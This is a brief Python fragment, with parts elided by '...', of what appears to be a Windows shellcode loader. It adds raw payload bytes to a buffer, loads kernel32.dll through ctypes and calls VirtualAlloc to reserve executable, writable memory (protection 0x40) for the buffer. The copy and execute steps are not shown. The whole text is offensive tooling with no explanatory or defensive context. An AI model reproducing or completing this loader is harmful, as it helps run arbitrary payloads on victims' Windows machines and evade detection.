...
buf += b"\xa8\x01\x67\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba"
...
buf_size = len(buf_arr)
kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll")
kernel32.VirtualAlloc.restype = ctypes.c_uint64

sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), 0x3000, 0x00000040)
buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr)
